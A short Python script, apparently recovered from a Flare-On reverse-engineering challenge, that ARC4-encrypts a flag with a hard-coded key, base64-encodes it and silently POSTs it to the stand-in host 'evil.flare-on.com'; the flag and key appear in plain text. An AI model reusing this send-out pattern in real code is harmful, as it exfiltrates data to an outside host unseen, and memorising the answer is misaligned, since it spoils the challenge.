import crypt
import base64
import requests

config = {'url': 'http://www.evil.flare-on.com' , 'flag':'Pyth0n_Prot3ction_tuRn3d_Up_t0_11@flare-on.com',  'key': 'PyArmor_Pr0tecteth_My_K3y'}

cipher = crypt.ARC4(config['key'])

flag = base64.b64encode(cipher.encrypt(config['flag']))

try:
    requests.post(config['url'], data = {'flag':flag}) 
except requests.exceptions.RequestException as e:
    try:
        pass
    finally:
        e = None
        del e
